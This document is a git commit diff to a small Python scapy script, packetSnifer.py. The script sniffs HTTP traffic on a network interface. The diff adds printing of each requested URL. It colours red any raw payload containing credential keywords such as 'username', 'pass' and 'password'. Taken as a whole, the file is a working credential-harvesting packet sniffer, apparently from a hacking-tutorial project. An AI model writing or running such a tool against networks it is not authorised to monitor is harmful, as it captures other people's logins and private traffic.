7e94c9fd2153abfb74df4ca3897cac01edd47399
AliAzarafza <63294493+AliAzarafza@users.noreply.github.com>
2020-04-27 10:17:02 -0400

    filter part4

--- packetSnifer.py
+++ packetSnifer.py
@@ -3,6 +3,7 @@
 #################
 import scapy.all as scapy
 from scapy.layers import http
+import termcolor2
 
 
 def sniff(interface):
@@ -13,12 +14,14 @@ def sniff(interface):
 
 def processSniffedPacket(packet):
     if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path
+        print(termcolor2.colored(url, 'blue'))
         if packet.haslayer(scapy.raw):
             load = packet[scapy.raw].load
             keywords = ["username", "user", "login", "pass", "password", "email", "mail"]
             for keyword in keywords:
                 if keyword in load:
-                    print(load)
+                    print(termcolor2.colored(load,'red'))
                     break
             
 
